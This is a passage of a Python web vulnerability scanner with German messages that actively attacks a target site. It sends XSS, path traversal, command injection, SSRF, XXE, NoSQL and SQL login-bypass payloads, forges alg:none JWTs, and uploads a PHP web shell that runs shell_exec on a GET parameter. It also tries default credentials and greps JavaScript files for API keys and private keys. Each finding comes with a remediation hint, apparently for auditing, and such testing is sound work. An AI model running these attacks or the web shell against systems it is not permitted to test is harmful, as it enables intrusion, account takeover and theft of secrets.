    for pay in ["<script>alert(1)</script>","<img src=x onerror=alert(1)>",
                "<ScRiPt>alert(1)</ScRiPt>","<svg onload=alert(1)>"]:
        url_t = f"{base}/?q={urllib.parse.quote(pay, safe='')}"
        _,_,b2,_ = _req(url_t)
        if pay.lower() in b2.lower():
            xss_hit = pay; break
    if xss_hit:
        _hit(3,"INJECTION","XSS Reflected", xss_hit[:35],
             "Eingabe wird ungefiltert ausgegeben — JavaScript wird ausgeführt.",
             "Alle Ausgaben HTML-enkodieren: htmlspecialchars() / escapeHtml().")
    else:
        _ok("XSS: nicht reflektiert")

    # ═══ 6. PATH TRAVERSAL / LFI ════════════════════════════
    _section("PATH TRAVERSAL / LFI", 6, TOTAL)
    lfi_hit = None
    for pay, sig in [("../../../etc/passwd","root:x:"),
                     ("..%2F..%2F..%2Fetc%2Fpasswd","root:x:"),
                     ("../../../windows/win.ini","[fonts]")]:
        _,_,b2,_ = _req(f"{base}/?file={pay}")
        if sig in b2:
            lfi_hit = pay; break
    if lfi_hit:
        _hit(3,"INJECTION","Path Traversal/LFI", lfi_hit[:30],
             "Beliebige Systemdateien lesbar — /etc/passwd, Configs, Quellcode.",
             "Dateipfade nie aus Nutzereingaben zusammenbauen. Whitelist nutzen.")
    else:
        _ok("Path Traversal: nicht anfällig")

    # ═══ 7. COMMAND INJECTION ════════════════════════════════
    _section("COMMAND INJECTION", 7, TOTAL)
    cmd_hit = None
    for pay, sigs in [("; id",["uid=","root"]),("|whoami",["root","www"])]:
        _,_,b2,_ = _req(f"{base}/?cmd={urllib.parse.quote(pay,safe='')}")
        if any(s in b2 for s in sigs):
            cmd_hit = pay; break
    if cmd_hit:
        _hit(3,"INJECTION","Command Injection", cmd_hit,
             "Betriebssystem-Befehle werden ausgeführt — voller Server-Zugriff.",
             "Niemals Nutzereingaben in Systembefehle einbauen. subprocess mit Liste.")
    else:
        _ok("Command Injection: nicht anfällig")

    # ═══ 8. SSRF ═════════════════════════════════════════════
    _section("SSRF", 8, TOTAL)
    ssrf_hit = None
    for pay in ["http://169.254.169.254/latest/meta-data/","http://127.0.0.1:22","file:///etc/passwd"]:
        _,_,b2,_ = _req(f"{base}/?url={urllib.parse.quote(pay,safe='')}")
        if any(x in b2.lower() for x in ["ami-id","instance","root:x:","ssh"]):
            ssrf_hit = pay; break
    if ssrf_hit:
        _hit(3,"INJECTION","SSRF", ssrf_hit[:40],
             "Server fragt interne Dienste ab — AWS Metadata, Redis, Admin-Panels.",
             "Outbound-Requests whitelisten. Interne IPs blockieren.")
    else:
        _ok("SSRF: kein Zugriff auf interne Dienste")

    # ═══ 9. SENSITIVE DATEIEN ════════════════════════════════
    _section("SENSITIVE DATEIEN", 9, TOTAL)
    for path, sigs, sev, erkl, fix in [
        ("/.env",         ["DB_","SECRET","APP_KEY"], 3,
         ".env Datei öffentlich — enthält Passwörter, API-Keys, Secrets.",
         ".env aus Web-Root, Webserver: deny all für .env"),
        ("/.git/HEAD",    ["ref:","HEAD"],             3,
         ".git öffentlich — kompletter Quellcode downloadbar.",
         ".git aus Web-Root. Webserver: deny .git"),
        ("/phpmyadmin/",  ["phpMyAdmin","pma"],        2,
         "phpMyAdmin öffentlich erreichbar.",
         "Nur über VPN/IP-Whitelist zugänglich machen."),
        ("/swagger.json", ["swagger","paths"],         1,
         "API-Dokumentation öffentlich — zeigt alle Endpunkte.",
         "API-Docs hinter Auth schützen."),
        ("/actuator/env", ["activeProfiles","password"],3,
         "Spring Actuator offen — zeigt Passwörter, Konfiguration.",
         "Actuator-Endpoints nur intern zugänglich machen."),
        ("/server-status",["Total accesses","Apache"], 1,
         "Apache server-status offen — zeigt interne Requests.",
         "server-status auf Localhost beschränken."),
        ("/.htpasswd",    ["admin:","root:"],          3,
         ".htpasswd enthält gehashte Passwörter.",
         ".htpasswd außerhalb Web-Root speichern."),
        ("/backup.zip",   [],                          2,
         "Backup-Datei downloadbar.",
         "Backups außerhalb Web-Root speichern."),
        ("/config.php.bak",["password","database"],   3,
         "Backup der config.php enthält Datenbankzugangsdaten.",
         "Backup-Dateien löschen oder außerhalb Web-Root."),
        ("/crossdomain.xml",["allow-access-from domain=\"*\""],1,
         "Flash-Crossdomain zu offen konfiguriert.",
         "crossdomain.xml einschränken oder entfernen."),
    ]:
        cx,_,bx,_ = _req(base+path)
        if cx == 200 and (not sigs or any(s in bx for s in sigs)):
            _hit(sev, "DATEIEN", path, f"HTTP {cx} — erreichbar", erkl, fix)
        else:
            _ok(f"{path} — geschützt ({cx})")

    # ═══ 10. HTTP METHODEN ════════════════════════════════════
    _section("HTTP METHODEN", 10, TOTAL)
    for method in ["PUT","DELETE","TRACE","OPTIONS"]:
        cx,hx,bx,_ = _req(base, method=method)
        if method == "TRACE" and "TRACE" in bx.upper():
            _hit(1,"HTTP","TRACE aktiv","TRACE",
                 "HTTP TRACE ermöglicht XST (Cross-Site Tracing) Angriff.",
                 "TRACE in Webserver-Config deaktivieren.")
        elif method == "PUT" and cx not in (405,501,403,404):
            _hit(2,"HTTP",f"HTTP {method} erlaubt",f"HTTP {cx}",
                 f"{method}-Requests erlaubt — Dateien hochladbar/löschbar.",
                 f"HTTP {method} in Webserver deaktivieren.")
        elif method == "OPTIONS":
            allow = hx.get("Allow","")
            if allow: _ok(f"OPTIONS Allow: {allow[:40]}")

    # ═══ 11. LOGIN BYPASS ════════════════════════════════════
    _section("LOGIN BYPASS", 11, TOTAL)
    def _try_login(user, pw, xhdrs=None):
        h = {"Content-Type":"application/x-www-form-urlencoded"}
        if xhdrs: h.update(xhdrs)
        c2,_,b2,u2 = _req(login_url,"POST",{"username":user,"password":pw},hdrs=h)
        bl = b2.lower()
        return c2 not in (401,403) and any(x in bl for x in ["dashboard","welcome","logout","account","home","admin"]) \
               or (u2 != login_url and "login" not in u2.lower())

    login_bypassed = None
    for user, pw, label in [
        ("' OR '1'='1","' OR '1'='1","SQLi Classic"),
        ("admin'--",   "anything",    "SQLi Kommentar"),
        ("admin",      "",            "Leeres Passwort"),
        ("admin",      "admin",       "admin/admin"),
        ("admin",      "password",    "admin/password"),
        ("root",       "root",        "root/root"),
        ("test",       "test",        "test/test"),
    ]:
        if _try_login(user, pw):
            login_bypassed = (label, user, pw); break
        time.sleep(0.08)
    if login_bypassed:
        label, user, pw = login_bypassed
        _hit(3,"LOGIN","Login Bypass", f"{label}: {user}/{pw}",
             "Login mit Standard-/schwachen Credentials möglich.",
             "Starke Passwörter erzwingen. SQLi via Prepared Statements schützen.")
    else:
        _ok("Login: kein einfacher Bypass")

    # ═══ 12. RATE LIMITING ════════════════════════════════════
    _section("RATE LIMITING", 12, TOTAL)
    rl_codes = []
    for i in range(8):
        cx,_,_,_ = _req(f"{base}/?r={i}")
        rl_codes.append(cx); time.sleep(0.04)
    if 429 not in rl_codes:
        _hit(1,"AUTH","Kein Rate-Limit","8 Req ohne Block",
             "Brute-Force ungebremst möglich.",
             "Rate-Limiting: max 10 Req/Min pro IP + Session.")
    else:
        _ok("Rate-Limit aktiv")

    # ═══ 13. CSRF ════════════════════════════════════════════
    _section("CSRF", 13, TOTAL)
    forms = re.findall(r'<form[^>]*>.*?</form>', body0, re.DOTALL|re.IGNORECASE)
    csrf_vuln = forms and any(not re.search(r'csrf|_token|nonce', f, re.IGNORECASE) for f in forms)
    if csrf_vuln:
        _hit(2,"AUTH","CSRF-Token fehlt",f"{len(forms)} Form(en)",
             "Formulare ohne CSRF-Schutz — Angreifer kann Aktionen im Namen des Nutzers ausführen.",
             "CSRF-Token in jedes state-ändernde Formular einbauen.")
    else:
        _ok("CSRF-Token vorhanden")

    # ═══ 14. WAF ERKENNUNG ════════════════════════════════════
    _section("WAF ERKENNUNG", 14, TOTAL)
    cx,hx,bx,_ = _req(f"{base}/?q=<script>alert(1)</script>")
    waf_sigs = ["cloudflare","sucuri","incapsula","akamai","barracuda","mod_security","f5","imperva"]
    waf = next((s for s in waf_sigs if s in str(hx).lower() or s in bx.lower()), None)
    if cx == 403 or waf:
        _ok(f"WAF erkannt: {waf or 'unbekannt'} — Schutz aktiv")
    else:
        _hit(0,"WAF","Keine WAF erkannt","Payload nicht geblockt",
             "Kein Web Application Firewall erkannt.",
             "WAF einsetzen: Cloudflare, AWS WAF, ModSecurity.")

    # ═══ 15. SSL ZERTIFIKAT ══════════════════════════════════
    _section("SSL ZERTIFIKAT", 15, TOTAL)
    if base.startswith("https"):
        import ssl as _ssl
        host = base.replace("https://","").split("/")[0]
        try:
            ctx = _ssl.create_default_context()
            with ctx.wrap_socket(socket.socket(), server_hostname=host) as s:
                s.connect((host, 443))
                cert = s.getpeercert()
            exp = cert.get("notAfter","")
            if exp:
                from datetime import datetime as _dt2
                try:
                    exp_dt = _dt2.strptime(exp, "%b %d %H:%M:%S %Y %Z")
                    days   = (exp_dt - _dt2.now()).days
                    if days < 7:   _hit(3,"SSL","Zertifikat ABGELAUFEN",f"{days}d",
                                        "SSL-Zertifikat abgelaufen — Browser zeigt Warnung.","Zertifikat erneuern.")
                    elif days < 30: _hit(1,"SSL","Zertifikat läuft ab",f"{days} Tage",
                                        "Zertifikat läuft bald ab.","Vor Ablauf erneuern.")
                    else:           _ok(f"SSL OK — {days} Tage gültig")
                except: _ok("SSL: Zertifikat vorhanden")
        except Exception as e:
            _hit(2,"SSL","SSL-Fehler",str(e)[:30],
                 "SSL-Verbindung fehlerhaft.","SSL-Konfiguration prüfen.")
    else:
        _ok("SSL: kein HTTPS — bereits gemeldet")

    # ═══ 16. OPEN REDIRECT ═══════════════════════════════════
    _section("OPEN REDIRECT", 16, TOTAL)
    redir_hit = None
    for param in ["?url=","?redirect=","?next=","?goto="]:
        url_t = f"{base}/{param}https://evil-test-domain.com"
        try:
            req = urllib.request.Request(url_t, headers={"User-Agent":"Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=5) as r:
                if "evil-test-domain.com" in r.url:
                    redir_hit = param; break
        except urllib.error.HTTPError as e:
            loc = e.headers.get("Location","")
            if "evil-test-domain.com" in loc:
                redir_hit = param; break
        except: pass
    if redir_hit:
        _hit(2,"REDIRECT","Open Redirect",redir_hit,
             "Weiterleitungs-Parameter nicht validiert — Phishing-Angriffe möglich.",
             "Nur Weiterleitungen zu eigenen Domains erlauben. Whitelist nutzen.")
    else:
        _ok("Open Redirect: kein Bypass")

    # ═══ 17. HEADER INJECTION ════════════════════════════════
    _section("HEADER INJECTION", 17, TOTAL)
    cx,hx,bx,_ = _req(base, hdrs={"X-Forwarded-For":"127.0.0.1","X-Original-URL":"/admin"})
    if cx == 200 and any(x in bx.lower() for x in ["admin","dashboard","panel"]):
        _hit(2,"BYPASS","Header Bypass /admin","X-Original-URL: /admin",
             "Admin-Bereich über Header-Trick erreichbar.",
             "Alle IP/URL-Override-Header ignorieren oder validieren.")
    else:
        _ok("Header Injection: kein Bypass")
    cx2,hx2,_,_ = _req(login_url, hdrs={"X-Forwarded-For":f"127.0.0.{random.randint(2,254)}"})
    if cx2 != 0:
        _ok("XFF Rate-Limit Bypass: kein Unterschied erkennbar")

    # ═══ 18. ABSCHLIESSENDER CHECK ═══════════════════════════
    _section("INFORMATIONEN & EXTRAS", 18, TOTAL)
    # robots.txt
    cx,_,bx,_ = _req(base+"/robots.txt")
    if cx==200 and "Disallow" in bx:
        disallowed = re.findall(r'Disallow:\s*(\S+)', bx)
        _hit(0,"INFO","robots.txt Disallows",f"{len(disallowed)} Einträge",
             "robots.txt verrät interne Pfade die versteckt werden sollen.",
             "robots.txt nicht als Sicherheitsmaßnahme nutzen.")
        for d in disallowed[:5]:
            _ok(f"  robots Disallow: {d}")
    # CORS
    cx,hx,_,_ = _req(base, hdrs={"Origin":"https://evil.com"})
    acao = hx.get("Access-Control-Allow-Origin","")
    if acao == "*" or acao == "https://evil.com":
        _hit(2,"CORS","CORS Misconfiguration",f"ACAO: {acao}",
             "Jede Domain darf API-Requests machen.",
             "ACAO nur auf vertrauenswürdige Domains beschränken.")
    else:
        _ok(f"CORS: {acao or 'kein Header'}")

    print(f"  {DG}╠{'═'*W}╣{R}")

    # ═══ 19. IDOR ════════════════════════════════════════════
    _section("IDOR (Insecure Direct Object Reference)", 19, TOTAL)
    idor_hit = None
    # Hole normale Response für ID=1 als Baseline
    _,_,b_idor1,_ = _req(f"{base}/?id=1")
    _,_,b_idor2,_ = _req(f"{base}/?user=1")
    for param, val_a, val_b, bl in [
        ("?id=",   "1",   "2",    b_idor1),
        ("?user=", "1",   "2",    b_idor2),
        ("?uid=",  "1",   "2",    ""),
        ("?account=","1", "2",    ""),
        ("?order=","1",   "2",    ""),
        ("?invoice=","1", "2",    ""),
    ]:
        url_a = f"{base}/{param}{val_a}"
        url_b = f"{base}/{param}{val_b}"
        c_a,_,b_a,_ = _req(url_a); c_b,_,b_b,_ = _req(url_b)
        if c_a==200 and c_b==200 and len(b_b) > 100:
            bl_l = bl.lower() if bl else ""
            # Nur hit wenn response sich ändert + Daten enthält
            diff = abs(len(b_a)-len(b_b)) > 50
            has_data = any(x in b_b.lower() for x in ["email","user","name","account","order","price"])
            if diff and has_data:
                idor_hit = f"{param}1 → {param}2: Daten zugänglich"; break
    if idor_hit:
        _hit(3,"IDOR","IDOR — Fremddaten lesbar", idor_hit[:40],
             "Objekt-IDs direkt in URL — andere User-Daten abrufbar.",
             "Für jeden Request Berechtigungscheck: darf dieser User das sehen?")
    else:
        _ok("IDOR: kein Fremd-Datenzugriff erkennbar")

    # ═══ 20. SSTI ════════════════════════════════════════════
    _section("SSTI (Server-Side Template Injection)", 20, TOTAL)
    ssti_hit = None
    ssti_pays = [
        ("{{7*7}}",     "49"),
        ("${7*7}",      "49"),
        ("<%= 7*7 %>",  "49"),
        ("{{7*'7'}}",   "7777777"),
        ("#{7*7}",      "49"),
        ("*{7*7}",      "49"),
    ]
    for pay, expect in ssti_pays:
        for param in ["?name=","?q=","?search=","?msg=","?template="]:
            _,_,b2,_ = _req(f"{base}/{param}{urllib.parse.quote(pay,safe='')}")
            if expect in b2:
                ssti_hit = (pay, param, expect); break
        if ssti_hit: break
    if ssti_hit:
        pay,param,_ = ssti_hit
        _hit(3,"INJECTION","SSTI — Template Injection", f"{param}{pay}",
             "Template-Engine wertet Nutzereingaben aus → RCE möglich.",
             "Nutzereingaben NIE in Templates rendern. Input-Validierung + Sandbox.")
    else:
        _ok("SSTI: kein Template-Ausdruck ausgewertet")

    # ═══ 21. PARAMETER TAMPERING ═════════════════════════════
    _section("PARAMETER TAMPERING / PRIVILEGE ESCALATION", 21, TOTAL)
    priv_hit = None
    tamper_tests = [
        ({"isAdmin":"true","admin":"1"},         "Admin-Flag"),
        ({"role":"admin","user_role":"admin"},    "Rolle"),
        ({"debug":"true","test":"true"},          "Debug-Modus"),
        ({"price":"0","amount":"-1"},             "Preis 0"),
        ({"verified":"true","confirmed":"1"},     "Verification"),
    ]
    for data, label in tamper_tests:
        c2,h2,b2,_ = _req(base, "POST", data)
        b2l = b2.lower()
        if c2 not in (403,401,422) and any(x in b2l for x in ["admin","dashboard","success","welcome","granted","true"]):
            priv_hit = (label, str(data)[:40]); break
    if priv_hit:
        label, payload = priv_hit
        _hit(3,"BYPASS","Parameter Tampering", f"{label}: {payload}",
             "Serverseitige Berechtigungen durch POST-Parameter umgehbar.",
             "NIEMALS client-seitige Parameter für Berechtigungen nutzen.")
    else:
        _ok("Parameter Tampering: kein Privilege-Escalation erkannt")

    # ═══ 22. NOSQL INJECTION ═════════════════════════════════
    _section("NoSQL INJECTION", 22, TOTAL)
    nosql_hit = None
    nosql_pays = [
        ('{"$gt":""}',                   "MongoDB $gt operator"),
        ('{"$ne":null}',                 "MongoDB $ne operator"),
        ('{"$regex":".*"}',              "MongoDB $regex wildcard"),
        ('{"username":{"$gt":""},"password":{"$gt":""}}', "Auth bypass"),
        ("admin' || '1'=='1",            "JS injection"),
        ("' || 1==1 //",                 "JS comment bypass"),
    ]
    for pay, label in nosql_pays:
        for param in ["?username=","?user=","?q=","?filter="]:
            _,_,b2,_ = _req(f"{base}/{param}{urllib.parse.quote(pay,safe='')}")
            b2l = b2.lower()
            if any(x in b2l for x in ["dashboard","welcome","account","logged","home","user"]) \
               and not any(x in b2l for x in ["invalid","error","failed","incorrect"]):
                nosql_hit = (label, pay[:30]); break
        if nosql_hit: break
        # Auch als POST (JSON)
        c2,_,b2,_ = _req(login_url,"POST", '{"username":{"$gt":""},"password":{"$gt":""}}',
                          hdrs={"Content-Type":"application/json"})
        b2l = b2.lower()
        if c2 not in (400,401,403,422,500) and any(x in b2l for x in ["dashboard","welcome","logged","token"]):
            nosql_hit = ("MongoDB Auth-Bypass via JSON POST", '{"$gt":""}'); break
    if nosql_hit:
        label, pay = nosql_hit
        _hit(3,"INJECTION","NoSQL Injection", f"{label}: {pay}",
             "MongoDB/NoSQL-Operatoren wie $gt, $ne, $regex umgehen Authentifizierung.",
             "Eingaben als Strings behandeln. Mongoose sanitize-input nutzen.")
    else:
        _ok("NoSQL Injection: kein Operator-Bypass erkannt")

    # ═══ 23. DIRECTORY LISTING ═══════════════════════════════
    _section("DIRECTORY LISTING / EXPOSED DIRS", 23, TOTAL)
    dir_hits = []
    dir_paths = ["/uploads/","/images/","/files/","/static/","/assets/",
                 "/backup/","/old/","/temp/","/tmp/","/logs/","/data/",
                 "/js/","/css/","/includes/","/lib/","/src/"]
    for path in dir_paths:
        c2,_,b2,_ = _req(base+path)
        b2l = b2.lower()
        is_listing = (c2==200 and ("index of" in b2l or "parent directory" in b2l or
                                    ("<a href=" in b2l and "</a>" in b2l and ("modified" in b2l or "size" in b2l))))
        if is_listing:
            dir_hits.append(path)
            _hit(2,"DATEI","Directory Listing", path,
                 f"Verzeichnis-Inhalt öffentlich sichtbar — Dateien auflistbar.",
                 "Options -Indexes (Apache) oder autoindex off (Nginx).")
    if not dir_hits:
        _ok("Directory Listing: alle Verzeichnisse geschützt")

    # ═══ 24. XXE ═════════════════════════════════════════════
    _section("XXE (XML External Entity)", 24, TOTAL)
    xxe_hit = None
    xxe_pays = [
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
         "etc/passwd lesen"),
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><foo>&xxe;</foo>',
         "SSRF via XXE"),
        ('<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://169.254.169.254/"><foo>test</foo>',
         "DTD-SSRF"),
    ]
    xml_endpoints = [base+"/api/",base+"/api/upload",base+"/api/parse",base+"/upload",
                     base+"/import",base+"/xmlrpc.php",base+"/api/xml",base+"/"]
    for ep in xml_endpoints:
        for xxe_pay, label in xxe_pays:
            c2,_,b2,_ = _req(ep,"POST",xxe_pay,
                              hdrs={"Content-Type":"application/xml","Accept":"*/*"})
            b2l = b2.lower()
            if any(x in b2 for x in ["root:x:","ami-id","instance-id","daemon:"]) \
               and not any(x in b2l for x in ["<!doctype html","<html"]):
                xxe_hit = (ep, label, b2[:80]); break
        if xxe_hit: break
    if xxe_hit:
        ep, label, snip = xxe_hit
        _hit(3,"INJECTION","XXE — XML External Entity", f"{ep}: {label}",
             "XML-Parser wertet externe Entitäten aus → Dateilesen, SSRF, RCE möglich.",
             "XML External Entity Processing deaktivieren. libxml: LIBXML_NONET.")
    else:
        _ok("XXE: kein External-Entity-Processing erkannt")

    print(f"  {DG}╠{'═'*W}╣{R}")

    # ═══ 25. JWT BYPASS ══════════════════════════════════════
    _section("JWT BYPASS", 25, TOTAL)
    jwt_hit = None
    # Hole Tokens aus Cookies/Antworten
    cx0,hx0,bx0,_ = _req(login_url,"POST",{"username":"admin","password":"admin"})
    raw_headers = str(hx0)
    jwt_candidates = re.findall(r'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*', raw_headers+bx0)
    if jwt_candidates:
        tok = jwt_candidates[0]
        # Versuch 1: alg:none
        try:
            parts = tok.split(".")
            import base64 as _b64
            hdr_raw = parts[0] + "=" * (-len(parts[0]) % 4)
            hdr_dec = json.loads(_b64.urlsafe_b64decode(hdr_raw).decode(errors="ignore"))
            hdr_dec["alg"] = "none"
            new_hdr = _b64.urlsafe_b64encode(json.dumps(hdr_dec).encode()).rstrip(b"=").decode()
            # Payload mit admin-Rolle
            pay_raw = parts[1] + "=" * (-len(parts[1]) % 4)
            pay_dec = json.loads(_b64.urlsafe_b64decode(pay_raw).decode(errors="ignore"))
            pay_dec["role"] = "admin"; pay_dec["admin"] = True; pay_dec["isAdmin"] = True
            new_pay = _b64.urlsafe_b64encode(json.dumps(pay_dec).encode()).rstrip(b"=").decode()
            forged = f"{new_hdr}.{new_pay}."
            c2,_,b2,_ = _req(base, hdrs={"Authorization": f"Bearer {forged}",
                                           "Cookie": f"token={forged}; jwt={forged}"})
            if c2 == 200 and any(x in b2.lower() for x in ["admin","dashboard","welcome","panel"]):
                jwt_hit = ("alg:none Bypass", forged[:40])
        except: pass
        if not jwt_hit:
            # Versuch 2: leeres Secret HS256
            try:
                import hmac, hashlib
                new_hdr2 = _b64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').rstrip(b"=").decode()
                new_pay2 = _b64.urlsafe_b64encode(json.dumps({"sub":"admin","role":"admin","admin":True}).encode()).rstrip(b"=").decode()
                sig_input = f"{new_hdr2}.{new_pay2}".encode()
                sig = hmac.new(b"", sig_input, hashlib.sha256).digest()
                forged2 = f"{new_hdr2}.{new_pay2}.{_b64.urlsafe_b64encode(sig).rstrip(b'=').decode()}"
                c2,_,b2,_ = _req(base, hdrs={"Authorization": f"Bearer {forged2}"})
                if c2 == 200 and any(x in b2.lower() for x in ["admin","dashboard","welcome"]):
                    jwt_hit = ("Leeres Secret", forged2[:40])
            except: pass
    if jwt_hit:
        method, token = jwt_hit
        _hit(3,"AUTH","JWT Bypass", f"{method}: {token[:30]}",
             "JWT kann gefälscht werden — vollständiger Auth-Bypass.",
             "Signatur serverseitig verifizieren. Starkes Secret. alg:none ablehnen.")
    elif jwt_candidates:
        _ok(f"JWT vorhanden — kein einfacher Bypass erkannt")
    else:
        _ok("JWT: kein Token gefunden")

    # ═══ 26. HOST HEADER INJECTION ═══════════════════════════
    _section("HOST HEADER INJECTION", 26, TOTAL)
    host_hit = None
    evil_host = "evil-attacker.com"
    for ep in ["/password-reset", "/forgot-password", "/reset", "/auth/reset",
               "/account/reset", "/user/forgot", "/api/reset"]:
        c2,h2,b2,_ = _req(base+ep, "POST", {"email":"victim@example.com"},
                           hdrs={"Host": evil_host, "Content-Type":"application/x-www-form-urlencoded"})
        b2l = b2.lower()
        if c2 in (200,201,202) and any(x in b2l for x in ["sent","success","reset","email","check"]):
            host_hit = ep; break
    if host_hit:
        _hit(3,"BYPASS","Host Header Injection", host_hit,
             f"Passwort-Reset-Link enthält 'evil-attacker.com' → Link geht an Angreifer.",
             "Host-Header validieren. Reset-URLs aus eigenem Config bauen, nie aus Request-Headers.")
    else:
        _ok("Host Header Injection: kein Reset-Endpoint anfällig")

    # ═══ 27. FILE UPLOAD BYPASS ══════════════════════════════
    _section("FILE UPLOAD BYPASS", 27, TOTAL)
    upload_hit = None
    upload_eps = ["/upload","/api/upload","/file/upload","/media/upload",
                  "/image/upload","/avatar","/profile/picture","/admin/upload"]
    shell_names = ["shell.php","shell.php5","shell.php%00.jpg","shell.phtml",
                   "shell.php.jpg","shell.jpg.php","shell.PhP","shell.php3"]
    shell_content = b"<?php echo shell_exec($_GET['c']); ?>"
    for ep in upload_eps:
        for fname in shell_names[:3]:
            try:
                boundary = "----FormBoundary7MA4YWx"
                body = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{fname}\"\r\n"
                        f"Content-Type: image/jpeg\r\n\r\n").encode() + shell_content + \
                        f"\r\n--{boundary}--\r\n".encode()
                c2,h2,b2,_ = _req(base+ep, "POST", body,
                                   hdrs={"Content-Type": f"multipart/form-data; boundary={boundary}"})
                b2l = b2.lower()
                if c2 in (200,201) and any(x in b2l for x in ["success","uploaded","url","path","filename","ok"]):
                    upload_hit = (ep, fname); break
            except: pass
        if upload_hit: break
    if upload_hit:
        ep, fname = upload_hit
        _hit(3,"UPLOAD","File Upload Bypass", f"{ep} → {fname}",
             "PHP-Datei kann als Bild hochgeladen werden → Remote Code Execution.",
             "Whitelist für Dateiendungen. MIME-Type serverseitig prüfen. Uploads außerhalb Webroot.")
    else:
        _ok("File Upload: kein anfälliger Endpunkt gefunden")

    # ═══ 28. CRLF INJECTION ══════════════════════════════════
    _section("CRLF INJECTION", 28, TOTAL)
    crlf_hit = None
    crlf_pays = [
        "%0d%0aX-Injected: pwned",
        "%0aX-Injected: pwned",
        "%0d%0aSet-Cookie: injected=true",
        "\r\nX-Injected: pwned",
        "%E5%98%8A%E5%98%8DX-Injected: pwned",
    ]
    for pay in crlf_pays:
        for param in ["?q=","?url=","?redirect=","?next="]:
            c2,h2,b2,u2 = _req(f"{base}/{param}{pay}")
            if "X-Injected" in str(h2) or "injected" in str(h2).lower():
                crlf_hit = (param, pay[:30]); break
        if crlf_hit: break
    if crlf_hit:
        param, pay = crlf_hit
        _hit(2,"INJECTION","CRLF Injection", f"{param}{pay}",
             "Neue HTTP-Header einschleusbar — Cookie-Injection, Response-Splitting, XSS.",
             "Eingaben auf \\r\\n prüfen. URL-Parameter vor Redirect validieren.")
    else:
        _ok("CRLF: kein Header-Injection-Treffer")

    # ═══ 29. GRAPHQL INTROSPECTION ════════════════════════════
    _section("GRAPHQL INTROSPECTION", 29, TOTAL)
    gql_hit = None
    gql_eps = ["/graphql","/api/graphql","/gql","/api/gql","/v1/graphql","/query"]
    gql_query = '{"query":"{__schema{types{name}}}"}'
    for ep in gql_eps:
        c2,_,b2,_ = _req(base+ep, "POST", gql_query,
                          hdrs={"Content-Type":"application/json"})
        if c2 == 200 and "__schema" in b2 and "types" in b2:
            gql_hit = ep
            # Zähle Typen
            types = re.findall(r'"name"\s*:\s*"([^"]+)"', b2)
            break
    if gql_hit:
        n = len(set(types)) if 'types' in dir() else '?'
        _hit(2,"API","GraphQL Introspection offen", f"{gql_hit} — {n} Typen",
             "Gesamtes API-Schema öffentlich — alle Queries, Mutations, Felder sichtbar.",
             "Introspection in Produktion deaktivieren: introspection: false")
    else:
        _ok("GraphQL: kein offener Introspection-Endpunkt")

    # ═══ 30. MASS ASSIGNMENT ══════════════════════════════════
    _section("MASS ASSIGNMENT", 30, TOTAL)
    mass_hit = None
    mass_pays = [
        '{"isAdmin":true,"role":"admin","admin":true}',
        '{"role":"admin","permissions":["admin","write","delete"]}',
        '{"isAdmin":true,"is_staff":true,"is_superuser":true}',
        '{"balance":999999,"credits":99999}',
        '{"verified":true,"confirmed":true,"approved":true}',
    ]
    api_eps = ["/api/user","/api/profile","/api/me","/api/account","/api/register",
               "/api/update","/user/update","/profile/update","/account/settings"]
    for ep in api_eps:
        for pay in mass_pays[:3]:
            c2,_,b2,_ = _req(base+ep, "POST", pay,
                              hdrs={"Content-Type":"application/json"})
            b2l = b2.lower()
            if c2 in (200,201) and any(x in b2l for x in ["admin","true","success","updated","role"]):
                accepted = re.findall(r'"(?:role|isAdmin|admin|is_admin)"\s*:\s*(?:true|"admin")', b2)
                if accepted:
                    mass_hit = (ep, pay[:40]); break
        if mass_hit: break
    if mass_hit:
        ep, pay = mass_hit
        _hit(3,"BYPASS","Mass Assignment", f"{ep}: {pay}",
             "API akzeptiert interne Felder (isAdmin, role) von Nutzern.",
             "Whitelist erlaubter Felder. Input-DTOs nutzen. Niemals rohe Requests auf DB-Modelle mappen.")
    else:
        _ok("Mass Assignment: kein Privilege-Field akzeptiert")

    # ═══ 31. SENSITIVE JS ANALYSE ════════════════════════════
    _section("SENSITIVE DATEN IN JS-DATEIEN", 31, TOTAL)
    js_findings = []
    # Finde JS-Dateien aus Hauptseite
    js_urls = re.findall(r'src=["\']([^"\']*\.js[^"\']*)["\']', body0, re.IGNORECASE)
    js_urls = [(u if u.startswith("http") else base+"/"+u.lstrip("/")) for u in js_urls[:8]]
    js_urls.append(base+"/static/js/main.js")
    js_urls.append(base+"/assets/app.js")
    secret_patterns = [
        (r'(?:api[_-]?key|apikey)\s*[=:]\s*["\']([A-Za-z0-9_\-]{16,})["\']', "API Key"),
        (r'(?:secret|password|passwd|pwd)\s*[=:]\s*["\']([^"\']{8,})["\']', "Secret/Passwort"),
        (r'(?:token|access_token|auth_token)\s*[=:]\s*["\']([A-Za-z0-9_.\-]{20,})["\']', "Token"),
        (r'(?:aws_access|AKIA)[A-Z0-9]{16,}', "AWS Key"),
        (r'AIza[0-9A-Za-z\-_]{35}', "Google API Key"),
        (r'(?:mongodb|postgres|mysql|redis)://[^\s"\']+', "DB Connection String"),
        (r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----', "Private Key"),
        (r'(?:client_secret|clientSecret)\s*[=:]\s*["\']([^"\']{8,})["\']', "OAuth Secret"),
    ]
    for js_url in js_urls:
        c2,_,b2,_ = _req(js_url, timeout=5)
        if c2 != 200 or len(b2) < 10: continue
        for pattern, label in secret_patterns:
            matches = re.findall(pattern, b2, re.IGNORECASE)
            for m in matches[:2]:
                val = m if isinstance(m, str) else m[0] if m else ""
                if val and len(val) > 6:
                    js_findings.append((js_url.replace(base,"")[:30], label, val[:40]))
    if js_findings:
        _hit(3,"EXPOSURE","Secrets in JS-Dateien", f"{len(js_findings)} Fund(e)",
             "API-Keys, Tokens oder Passwörter im Frontend-JS — für jeden sichtbar.",
             "Secrets niemals im Frontend. Env-Variablen nur serverseitig nutzen.")
        for path, label, val in js_findings[:4]:
            _ok(f"  {path}: {label} → {val[:35]}")
    else:
